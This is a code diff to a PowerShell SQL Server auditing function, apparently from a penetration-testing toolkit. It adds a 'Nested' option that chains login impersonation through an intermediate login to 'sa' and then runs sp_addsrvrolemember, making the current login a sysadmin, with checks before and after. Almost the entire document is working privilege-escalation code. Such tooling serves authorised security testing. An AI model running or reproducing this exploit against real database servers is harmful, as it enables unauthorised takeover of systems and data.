@@ -22642,6 +22642,8 @@ Function Invoke-SQLAuditPrivImpersonateLogin
             Don't output anything.
             .PARAMETER Exploit
             Exploit vulnerable issues
+			.PARAMETER Nested
+            Exploit Nested Impersonation Capabilites
             .EXAMPLE
             PS C:\> Invoke-SQLAuditPrivImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Username evil -Password Password123!
 
@@ -22705,7 +22707,11 @@ Function Invoke-SQLAuditPrivImpersonateLogin
 
         [Parameter(Mandatory = $false,
         HelpMessage = 'Exploit vulnerable issues.')]
-        [switch]$Exploit
+        [switch]$Exploit,
+		
+		[Parameter(Mandatory = $false,
+        HelpMessage = 'Exploit Nested Impersonation Capabilites.')]
+        [switch]$Nested
     )
 
     Begin
@@ -22838,6 +22844,44 @@ Function Invoke-SQLAuditPrivImpersonateLogin
 
                             # Attempt to add the current login to sysadmins fixed server role
                             $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "EXECUTE AS LOGIN = '$ImpersonatedLogin';EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin';Revert" -SuppressVerbose
+
+                            # Verify the login was added successfully
+                            $SysadminPostCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
+                            if($SysadminPostCheck -eq 1)
+                            {
+                                Write-Verbose -Message "$Instance : - EXPLOITING: It was possible to make the current user ($CurrentLogin) a sysadmin!"
+                                $Exploited = 'Yes'
+                            }
+                            else
+                            {
+                                Write-Verbose -Message "$Instance : - EXPLOITING: It was not possible to make the current user ($CurrentLogin) a sysadmin."
+                            }
+                        }
+                        else
+                        {
+                            # Status user
+                            Write-Verbose -Message "$Instance : - EXPLOITING: The current login ($CurrentLogin) is already a sysadmin. No privilege escalation needed."
+                            $Exploited = 'No'
+                        }
+                    }
+					# ---------------------------------------------------------------
+                    # Exploit Nested Impersonation Vulnerability
+                    # ---------------------------------------------------------------
+                    if($Nested)
+                    {
+                        # Status user
+                        Write-Verbose -Message "$Instance : - EXPLOITING: Starting Nested Impersonation exploit process (under assumption to levels of nesting and 1st first can impersonate sa)..."
+
+                        # Check if user is already a sysadmin
+                        $SysadminPreCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
+                        if($SysadminPreCheck -eq 0)
+                        {
+                            # Status user
+                            Write-Verbose -Message "$Instance : - EXPLOITING: Verified that the current user ($CurrentLogin) is NOT a sysadmin."
+                            Write-Verbose -Message "$Instance : - EXPLOITING: Attempting to add the current user ($CurrentLogin) to the sysadmin role..."
+
+                            # Attempt to add the current login to sysadmins fixed server role
+                            $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "EXECUTE AS LOGIN = '$ImpersonatedLogin';EXECUTE AS LOGIN = 'sa';EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin'"
 
                             # Verify the login was added successfully
                             $SysadminPostCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
